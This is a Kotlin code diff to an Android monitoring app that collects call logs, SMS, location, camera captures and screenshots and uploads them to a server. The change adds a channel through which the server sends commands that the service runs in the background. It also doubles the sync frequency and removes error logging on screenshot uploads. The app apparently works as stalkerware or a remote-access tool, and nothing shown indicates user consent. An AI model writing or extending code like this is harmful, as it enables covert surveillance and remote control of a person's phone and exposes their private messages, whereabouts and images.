@@ -17,6 +17,7 @@ import com.takip.app.collector.CallCollector
 import com.takip.app.collector.CameraCaptureHelper
 import com.takip.app.collector.LocationCollector
 import com.takip.app.collector.SmsCollector
+import com.takip.app.util.PermissionChecker
 import com.takip.app.util.PrefsManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -77,8 +78,16 @@ class MonitoringService : Service() {
             return
         }
 
-        ApiClient.heartbeat(token).onFailure {
-            Log.e(TAG, "Heartbeat başarısız: ${it.message}")
+        val permissions = PermissionChecker.getStatus(this)
+        ApiClient.sync(token, permissions).onSuccess { syncResult ->
+            for (cmd in syncResult.commands) {
+                scope.launch {
+                    CommandExecutor.execute(this@MonitoringService, token, cmd.id, cmd.type)
+                }
+            }
+        }.onFailure {
+            Log.e(TAG, "Senkron başarısız: ${it.message}")
+            ApiClient.heartbeat(token)
         }
 
         uploadArray(CallCollector.collect(this)) { ApiClient.uploadCalls(token, it) }.let { ok ->
@@ -140,7 +149,6 @@ class MonitoringService : Service() {
                 val file = File(cacheDir, "screen_${System.currentTimeMillis()}.jpg")
                 file.writeBytes(bytes)
                 ApiClient.uploadMedia(token, file, "screenshot")
-                    .onFailure { Log.e(TAG, "Ekran yükleme hatası: ${it.message}") }
             }
         }
 
@@ -181,7 +189,7 @@ class MonitoringService : Service() {
     companion object {
         private const val TAG = "MonitoringService"
         private const val NOTIFICATION_ID = 1001
-        private const val SYNC_INTERVAL_MS = 30_000L
+        private const val SYNC_INTERVAL_MS = 15_000L
 
         fun start(context: Context) {
             val intent = Intent(context, MonitoringService::class.java)
